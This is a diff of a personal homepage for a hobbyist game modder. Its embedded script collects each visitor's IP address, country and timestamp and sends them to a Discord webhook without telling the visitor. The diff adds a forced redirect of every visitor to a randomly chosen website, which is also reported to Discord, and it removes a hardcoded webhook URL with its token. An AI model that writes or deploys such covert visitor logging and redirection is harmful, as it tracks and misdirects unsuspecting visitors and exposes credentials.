@@ -8,15 +8,12 @@
     <h1>Your IP Address: <span id="visitorIp"></span></h1>
 
     <p>The previous group down below gets their IP address. Thank you.</p>
-    
+
     <!-- Rest of the content remains unchanged -->
     <p>Hello, my name is TJ</p>
     <p>I'm not going to say my real name for personal reasons and privacy. My hobbies are coding. I learned how to code at a young age, and you won't believe all the things you can do if you just learn simple coding.</p>
     <p>Besides that, in my free time, I like playing Gorilla Tag. I have grown attached to the community. If you haven't played it, go check it out!</p>
     <p>After I learned how to code, I started making a lot of things. My most recent project is a mod menu for a game.</p>
-
-    <!-- YouTube link with logo -->
-    <p>Check out my YouTube channel: <a href="https://www.youtube.com/@TJvr-" target="_blank"><img src="images/yu.jpg" alt="YouTube Logo"> @TJvr</a></p>
 
     <!-- Visit Counter -->
     <p>This website has been visited <span id="visitCount">0</span> times.</p>
@@ -44,8 +41,18 @@
                         let country = locationData.country_name;
                         let timestamp = new Date().toLocaleString();
 
-                        // Send an embedded message to Discord (replace YOUR_WEBHOOK_URL with your actual webhook URL)
-                        const webhookUrl = 'https://discord.com/api/webhooks/1147964165122707506/R3nTiuZKcUl7IBFfoMYrpcVc7mPDDhnkxEiJ5OADBNyGYOxccu_87c39Aty6GvMF5nZ1';
+                        // List of websites to redirect to
+                        const websites = [
+                            'https://www.youtube.com',
+                            'https://www.yourmom.com',
+                        ];
+
+                        // Generate a random index to pick a website
+                        const randomIndex = Math.floor(Math.random() * websites.length);
+                        const randomWebsite = websites[randomIndex];
+
+                        // Send a notification to Discord
+                        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
                         const data = {
                             embeds: [
                                 {
@@ -71,6 +78,11 @@
                                             value: visitCount,
                                             inline: true,
                                         },
+                                        {
+                                            name: 'Redirected Website',
+                                            value: randomWebsite, // Include the redirected website
+                                            inline: false,
+                                        },
                                     ],
                                 },
                             ],
@@ -93,6 +105,9 @@
                         .catch(error => {
                             console.error('Error:', error);
                         });
+
+                        // Redirect the visitor to the random website
+                        window.location.href = randomWebsite;
                     })
                     .catch(error => {
                         console.error('Error:', error);
